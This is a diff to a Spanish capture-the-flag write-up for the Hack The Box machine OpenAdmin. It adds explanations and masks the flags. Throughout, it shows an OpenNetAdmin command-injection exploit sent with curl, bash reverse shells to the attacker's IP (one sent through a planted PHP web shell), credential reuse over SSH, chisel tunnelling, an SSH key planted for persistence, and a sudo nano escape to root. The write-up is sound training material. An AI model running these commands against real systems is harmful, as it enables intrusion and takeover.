@@ -191,9 +191,9 @@ Shellcodes: No Results
 
 Realizaremos la misma búsqueda por Internet y también logramos encontrar vulnerabilidades para esta versión.
 
-<figure><img src="../../.gitbook/assets/imagen (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (4).png" alt="" width="530"><figcaption></figcaption></figure>
 
-
+El exploit que hemos encontrado para lograr explotar la vulnerabilidad es la siguiente, realiza una solicitud mediante `cURL` en el cual a través de una serie de datos podemos conseguir una ejecución de comandos remotos `RCE`.
 
 ```bash
 #!/bin/bash
@@ -205,64 +205,32 @@ while true;do
 done
 ```
 
+#### Explotación manual
 
+Realizamos la explotación de la vulnerabilidad manualmente a través de `cURL` y comprobamos que al intentar ejecutar el comando `id`, en el resultado que se nos muestra confirmamos el `output` de la ejecución de comandos.
 
 ```bash
 ❯ curl -s -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;id&xajaxargs[]=ping"  http://10.10.10.171/ona/
 <?xml version="1.0" encoding="utf-8" ?><xjx><cmd n="js"><![CDATA[removeElement('tooltips_results');]]></cmd><cmd n="ce" t="window_container" p="tooltips_results"><![CDATA[div]]></cmd><cmd n="js"><![CDATA[initialize_window('tooltips_results');el('tooltips_results').style.display = 'none';el('tooltips_results').style.visibility = 'hidden';el('tooltips_results').onclick = function(ev) { focus_window(this.id); };]]></cmd><cmd n="as" t="tooltips_results" p="innerHTML"><![CDATA[
-        <!-- This wrapper table is so that internal tables can be set to 100% width and they won't stretch the box too wide. -->
-        <table id="tooltips_results_table" cellspacing="0" border="0" cellpadding="0">
-        <tr>
-        <td>
 
-            <!-- Window bar and close button -->
-            <table id="tooltips_results_title_table" class="window_title" style="border-bottom: 1px solid #69A6DE;background-color: #69A6DE;" width="100%" cellspacing="0" border="0" cellpadding="0">
-            <tr>
-
-                <td id="tooltips_results_title"
-                    width="99%"
-                    align="left"
-                    nowrap="true"
-                    onMouseDown="focus_window('tooltips_results'); dragStart(event, 'tooltips_results');"
-                    style="cursor: move;
-                           white-space: nowrap;
-                           font-weight: bold;
-                           text-align: left;
-                           padding: 2px 4px;">Ping Results</td>
-
-                <td id="tooltips_results_title_r"
-                    align="right"
-                    nowrap="true"
-                    style="color: #294157;
-                           white-space: nowrap;
-                           text-align: right;
-                           padding: 2px 4px;"><span id="tooltips_results_title_help"></span>&nbsp;<a title="Close window" style="cursor: pointer;" onClick="removeElement('tooltips_results');"><img src="/ona/images/icon_close.gif" border="0" /></a></td>
-
-            </tr>
-            </table>
-<!-- Module Output -->
-<table style="background-color: #F2F2F2; padding-left: 25px; padding-right: 25px;" width="100%" cellspacing="0" border="0" cellpadding="0">
-    <tr>
-        <td align="left" class="padding">
-            <br>
-            <div style="border: solid 2px #000000; background-color: #FFFFFF; width: 650px; height: 350px; overflow: auto;resize: both;">
-                <pre style="padding: 4px;font-family: monospace;">uid=33(www-data) gid=33(www-data) groups=33(www-data)
+...[snip]...
+ <pre style="padding: 4px;font-family: monospace;">uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-
+El siguiente paso será lograr obtener una Reverse Shell para lograr conectarnos a la máquina vulnerable. Para ello, nos pondremos en escucha para recibir la Reverse Shell.
 
 ```bash
 ❯ nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-
+A través del siguiente comando, lograremos explotar la vulnerabilidad presente en `OpenNetAdmin` indicándole que ejecute una Reverse Shell hacia nuestro equipo.
 
 ```bash
 ❯ curl -s -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;/bin/bash -c 'bash -i >%26 /dev/tcp/10.10.14.2/443 0>%261'&xajaxargs[]=ping"  http://10.10.10.171/ona/
 ```
 
-
+Verificamos que finalmente logramos obtener acceso a la máquina victima con el usuario`www-data`.
 
 ```bash
 ❯ nc -nlvp 443
@@ -273,7 +241,9 @@ bash: no job control in this shell
 www-data@openadmin:/opt/ona/www$ 
 ```
 
+#### Explotación automatizada
 
+Por otro lado, también podemos hacer la explotación a través del siguiente exploit que nos hemos encontrado en GitHub el cual realiza la explotación de la vulnerabilidad de manera más automatizada.
 
 {% embed url="https://github.com/sec-it/OpenNetAdmin-RCE" %}
 
@@ -288,20 +258,20 @@ Recibiendo objetos: 100% (10/10), 4.78 KiB | 4.78 MiB/s, listo.
 Resolviendo deltas: 100% (2/2), listo.
 ```
 
-
+Nos volveremos a poner en escucha con `nc` para recibir la Reverse Shell.
 
 ```bash
 ❯ nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-
+Ejecutaremos el exploit indicándole la `URL Target` donde se encuentra el `OpenNetAdmin` y le indicaremos que ejecute una Reverse Shell.
 
 ```bash
 ❯ ruby exploit.rb exploit http://10.10.10.171/ona/ '/bin/bash -c "bash -i >& /dev/tcp/10.10.14.2/443 0>&1"'
 ```
 
-
+Comprobamos que finalmente logramos obtener acceso al sistema a través de la Reverse Shell. Al recibir la RevShell, realizaremos el tratamiento básico para lograr obtener una `TTY` totalmente interactiva.
 
 ```bash
 ❯ nc -nlvp 443
@@ -325,6 +295,8 @@ www-data@openadmin:/opt/ona/www$ stty rows 46 columns 230
 ## Pivoting as jimmy user
 
 ### Information Leakage
+
+Revisando el directorio donde nos encontramos, verificamos un archivo llamado `database_settings.inc.php` de configuración de la base de datos. En dicho archivo, logramos obtener una contraseña en texto plano.
 
 ```bash
 www-data@openadmin:/opt/ona/www/local/config$ ls -l
@@ -358,6 +330,8 @@ $ona_contexts=array (
 
 ### Trying access on SSH with recently found password
 
+Probamos de comprobar si estas credenciales se reutilizan para el usuario `jimmy`que hemos encontrado que dispone de `bash` (comprobado desde el archivo `/etc/passwd`).
+
 ```bash
 ❯ sshpass -p 'n1nj4W4rri0R!' ssh jimmy@10.10.10.171
 Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
@@ -390,6 +364,8 @@ jimmy@openadmin:~$
 
 ### Internal Website found
 
+Revisando los archivos de configuración de `Apache`, nos encontramos habilitado una página web interna en el puerto `52846` la cual se llama `internal.openadmin.htb` y tiene asignado el `AssignUserID`como `joanna`. Lo cual nos sugiere que quizás `joanna` levante este servicio.
+
 ```bash
 jimmy@openadmin:/home$ cat /etc/apache2/sites-enabled/internal.conf 
 Listen 127.0.0.1:52846
@@ -410,16 +386,17 @@ AssignUserID joanna joanna
 
 ### Port Forwarding with Chisel
 
-
+Desde nuestro equipo atacante, dispondremos del binario de `chisel` el cual compartiremos a través de un servidor web con Python.
 
 ```bash
 ❯ ls -l chisel
 .rwxr-xr-x kali kali 8.9 MB Sun Feb 16 03:43:15 2025  chisel
+
 ❯ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+En la máquina víctima, nos descargaremos el binario compartido y le daremos los permisos de ejecución correspondientes.
 
 ```bash
 jimmy@openadmin:/tmp$ wget 10.10.14.2/chisel; chmod +x chisel
@@ -436,16 +413,16 @@ chisel                      100%[==========================================>]   
 jimmy@openadmin:/tmp$ 
 ```
 
-
+En nuestra máquina atacante, configuraremos el `chisel`para que actúe como servidor a través del puerto `1234`.
 
 ```bash
-❯ ./chisel server --reverse -p 1234;
+❯ ./chisel server --reverse -p 1234
 2025/03/07 06:49:43 server: Reverse tunnelling enabled
 2025/03/07 06:49:43 server: Fingerprint QXtg34BSTLW+VL8Zau8gxZzNeq/nc/PIJyDObTACqS8=
 2025/03/07 06:49:43 server: Listening on http://0.0.0.0:1234
 ```
 
-
+A través de la máquina vícitma, indicaremos a `chisel` que actúe como cliente y se conecte a nuestro equipo realizando un `Port Forwarding` del puerto interno de la página web encontrada hacia nuestro equipo.
 
 ```bash
 jimmy@openadmin:/tmp$ ./chisel client 10.10.14.2:1234 R:52846:127.0.0.1:52846
@@ -453,11 +430,13 @@ jimmy@openadmin:/tmp$ ./chisel client 10.10.14.2:1234 R:52846:127.0.0.1:52846
 2025/03/07 05:52:05 client: Connected (Latency 276.304265ms)
 ```
 
-
+Desde nuestro navegador accederemos a [http://localhost:52846](http://localhost:52846) y comprobaremos el siguiente contenido de la página web.
 
 <figure><img src="../../.gitbook/assets/5436_vmware_v3hltd2ne8.png" alt=""><figcaption></figcaption></figure>
 
 ### Gaining Access via Webshell in a Writable Web Directory
+
+A través del usuario `jimmy`, comprobamos que disponemos de permisos de escritura en el directorio `/var/www/internal` en el cual se está levantando esta página web interna. Por lo tanto, lo que decidimos probar es en crear un archivo llamado `gzzcoo.php` el cual se trate de una simple `web shell` para utilizarla y lograr ejecutar comandos.
 
 ```bash
 jimmy@openadmin:/var/www/internal$ ls -la
@@ -474,21 +453,21 @@ jimmy@openadmin:/var/www/internal$ cat gzzcoo.php
  ?>
 ```
 
-
+Desde nuestra máquina atacante, realizaremos la comprobación de ejecución de comandos. En nuestra primera prueba, indicamos que ejecute el comando `id`, confirmando que la usuaria `joanna` ees la que ejecuta este servidor web y hemos sido capaces de ejecutar comandos remotod.s&#x20;
 
 ```bash
 ❯ curl -s 'http://127.0.0.1:52846/gzzcoo.php?cmd=id'
 uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
 ```
 
-
+Nos pondremos en escucha con `nc` para recibir la Reverse Shell.
 
 ```bash
 ❯ nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-
+Codificaremos en `URL Encode` la sintaxis de la Reverse Shell y utilizaremos la herramienta de `cURL`para que realice la petición hacia nuestra `web shell`y logre ejecutar la Reverse Shell.
 
 ```bash
 ❯ echo -n 'bash -c "bash -i >& /dev/tcp/10.10.14.2/443 0>&1"' | jq -sRr @uri
@@ -496,7 +475,7 @@ bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.2%2F443%200%3E%261%2
 ❯ curl -s 'http://127.0.0.1:52846/gzzcoo.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.2%2F443%200%3E%261%22'
 ```
 
-
+Comprobamos que disponemos de acceso al sistema con el usuario `joanna` y logramos visualizar finalmente la flag **user.txt**.
 
 ```bash
 ❯ nc -nlvp 443
@@ -507,10 +486,10 @@ bash: no job control in this shell
 joanna@openadmin:/var/www/internal$ whoami
 joanna
 joanna@openadmin:/var/www/internal$ cat /home/joanna/user.txt 
-7bd98aee5d982320703e6c095a5d11b7
+7bd9************************
 ```
 
-
+Realizaremos un tratamiento de la terminal para poder obtener una TTY totalmente interactiva.
 
 ```bash
 oanna@openadmin:/var/www/internal$ script /dev/null -c bash
@@ -526,13 +505,26 @@ joanna@openadmin:/var/www/internal$ export SHELL=bash
 joanna@openadmin:/var/www/internal$ stty rows 46 columns 230
 ```
 
-
-
 ## Privilege Escalation
 
 ### Abusing Sudoers Privilege (nano)
 
+Al revisar si el usuario `joanna` dispone de algún permiso de `sudoers`, nos mostraba el siguiente mensaje de error.&#x20;
 
+{% hint style="info" %}
+Según [`ChatGPT`](https://chatgpt.com), este mensaje se puede deber a estos motivos.
+
+#### Posibles causas:
+
+1. **Falta de un entorno de sesión completo**\
+   Cuando te conectas por SSH, el sistema te asigna una sesión completa con todas las variables de entorno y permisos adecuados. En cambio, con una reverse shell, el entorno es mínimo y puede que `sudo` no tenga acceso a todas las configuraciones necesarias.
+2. **Limitaciones de permisos en `setresuid`**\
+   El error `setresuid(0, -1, -1): Operation not permitted` indica que `sudo` está intentando cambiar al usuario root, pero no tiene permiso en este entorno. Esto podría deberse a:
+   * Un control de seguridad como **seccomp** o **AppArmor** que bloquea ciertas llamadas al sistema.
+   * Un sistema con restricciones para shells no interactivas.
+3. **Audit Plugin de sudo fallando**\
+   El error `error initializing audit plugin sudoers_audit` sugiere que `sudo` está intentando registrar la acción, pero no puede porque la shell inversa no tiene un entorno adecuado para inicializar el módulo de auditoría.
+{% endhint %}
 
 ```bash
 joanna@openadmin:/var/www/internal$ sudo -l
@@ -540,7 +532,7 @@ sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted
 sudo: error initializing audit plugin sudoers_audit
 ```
 
-
+Por lo tanto, lo que decidimos es en subir nuestra clave pública en las claves autorizadas SSH del usuario`joanna`. Para ello, nos crearemos unas claves `SSH` en nuestro equipo de atacante y copiaremos el contenido de la clave pública generada.
 
 ```bash
 ❯ ssh-keygen
@@ -564,11 +556,12 @@ The key's randomart image is:
 |o+*B+o. . o      |
 |#B*=o.   oE.     |
 +----[SHA256]-----+
+
 ❯ cat /home/kali/.ssh/id_ed25519.pub
 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB30SsUFMFi9+gBGbURaDWPr6LcsZ7seEWZgAtRqGLv9 kali@kali
 ```
 
-
+Escribiremos en el archivo `/home/joanna/.ssh/authorized_keys` nuestra clave pública `SSH` para ganar acceso al equipo como el usuario `joanna` mediante `SSH` sin proporcionar credenciales.
 
 ```bash
 joanna@openadmin:/var/www/internal$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB30SsUFMFi9+gBGbURaDWPr6LcsZ7seEWZgAtRqGLv9 kali@kali' > /home/joanna/.ssh/authorized_keys
@@ -576,7 +569,7 @@ joanna@openadmin:/var/www/internal$ cat /home/joanna/.ssh/authorized_keys
 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB30SsUFMFi9+gBGbURaDWPr6LcsZ7seEWZgAtRqGLv9 kali@kali
 ```
 
-
+Probamos de autenticarnos con el usuario `joanna` conectándonos mediante `SSH` al equipo, finalmente logramos el acceso correctamente. Ejecutaremos un `export TERM=xterm` para poder realizar `Ctrl+L`.
 
 ```bash
 ❯ ssh joanna@10.10.10.171
@@ -613,7 +606,11 @@ Last login: Tue Jul 27 06:12:07 2021 from 10.10.14.15
 joanna@openadmin:~$ export TERM=xterm
 ```
 
+Ahora si ejecutamos `sudo -l`, ya no nos muestra el mensaje de error que vimos anteriormente. Al comprobar si este usuario dispone depermisos de `sudoers`, nos encontramos que el usuario puede ejecutar como `sudo` sin proporcionar credenciales el binario`/bin/nano` sobre el archivo ubicado en `/opt/priv`.
 
+{% hint style="info" %}
+En informática, nano (oficialmente GNU nano) es un editor de texto para sistemas Unix basado en curses. Es un clon de Pico, el editor del cliente de correo electrónico Pine. nano trata de emular la funcionalidad y la interfaz de fácil manejo de Pico, pero sin la integración con Pine.
+{% endhint %}
 
 ```bash
 joanna@openadmin:~$ sudo -l
@@ -624,7 +621,7 @@ User joanna may run the following commands on openadmin:
     (ALL) NOPASSWD: /bin/nano /opt/priv
 ```
 
-
+A través de la herramienta de [`searchbins`](https://github.com/r1vs3c/searchbins) nos encontramos la manera de explotar este binario como `sudo` y lograr obtener una Shell como usuario `root`.
 
 ```bash
 ❯ searchbins -b nano -f sudo
@@ -639,7 +636,9 @@ User joanna may run the following commands on openadmin:
 	| reset; sh 1>&0 2>&0
 ```
 
+Ejecutaremos el comando `sudo /bin/nano /opt/priv` para editar el archivo con permisos de `sudo`.
 
+Una vez estemos dentro del archivo con el editor `nano`, para poder obtener una shell como `root`, deberemos de presionar `Ctrl+R` para acceder al apartado de `Read file`.
 
 ```bash
 joanna@openadmin:~$ sudo /bin/nano /opt/priv
@@ -647,39 +646,21 @@ joanna@openadmin:~$ sudo /bin/nano /opt/priv
 
 <figure><img src="../../.gitbook/assets/5438_vmware_KmrP2NgF9u.png" alt=""><figcaption></figcaption></figure>
 
-```bash
-  GNU nano 2.9.3                                                                                                 /opt/priv                                                                                                            
-
-
-                                                                                                        [ Read 0 lines ]
-^G Get Help      ^O Write Out     ^W Where Is      ^K Cut Text      ^J Justify       ^C Cur Pos       M-U Undo         M-A Mark Text    M-] To Bracket   M-▲ Previous     ^B Back          ^◀ Prev Word     ^A Home
-^X Exit          ^R Read File     ^\ Replace       ^U Uncut Text    ^T To Spell      ^_ Go To Line    M-E Redo         M-6 Copy Text    M-W WhereIs Next M-▼ Next         ^F Forward       ^▶ Next Word     ^E End
-```
-
-
+Una vez estemos en el modo de `Read File`, presionaremos la combinación de `Ctrl+X` para acceder a la opción de `Execute Command`.
 
 <figure><img src="../../.gitbook/assets/imagen (5).png" alt=""><figcaption></figcaption></figure>
 
-```bash
-  GNU nano 2.9.3                                                                                                 /opt/priv                                                                                                            
+Al seleccionar esta nueva opción, comprobamos que nos permite realizar una ejecución de comandos. Esto es debido que `nano` tiene implementado una manera para lograr ejecutar un comando en el sistema y que el `output` del resultado del comando se almacene en nuestro archivo en el que nos encontramos trabajando.
 
-
-
-
-File to insert [from ./]:                                                                                                                                                                                                             
-^G Get Help                                                                 ^X Execute Command                                                          ^T To Files
-^C Cancel                                                                   M-F New Buffer
-```
-
-
+Teniendo esto en cuenta, podemos aprovecharnos de esto para ganar acceso a una shell a través del siguiente comando.
 
 ```bash
-Command to execute: reset; sh 1>&0 2>&0                                                                                                                                                                                               
-^G Get Help                                                                                                        ^X Read File
-^C Cancel                                                                                                          M-F New Buffer
+reset; sh 1>&0 2>&0
 ```
 
 <figure><img src="../../.gitbook/assets/5440_vmware_DZfbDtVaH9.png" alt=""><figcaption></figcaption></figure>
+
+Verificamos que por detrás de `nano`, se nos ha abierto una `shell` en la cual podemos ejecutar comandos. Ejecutaremos `/bin/bash`para obtener una `bash`. Finalmente logramos visualizar la flag **root.txt**.
 
 <figure><img src="../../.gitbook/assets/5441_vmware_cIDCOTELmi.png" alt=""><figcaption></figcaption></figure>
 
@@ -688,5 +669,5 @@ Command to execute: reset; sh 1>&0 2>&0
 root
 # /bin/bash   
 root@openadmin:/home/joanna# cat /root/root.txt 
-9452b53517afa9e132e5e6016465c4a1
+9452****************************
 ```
